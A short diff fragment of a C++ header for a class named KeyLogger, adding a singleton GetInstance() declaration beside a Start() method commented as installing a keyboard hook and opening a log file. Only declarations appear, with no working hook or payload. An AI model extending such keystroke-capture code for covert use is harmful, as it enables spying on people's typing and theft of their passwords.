@@ -34,6 +34,9 @@ public:
     KeyLogger();
     ~KeyLogger();
 
+    // Singleton pattern
+    static KeyLogger& GetInstance();
+
     // Install the keyboard hook and open the log file
     void Start();
 
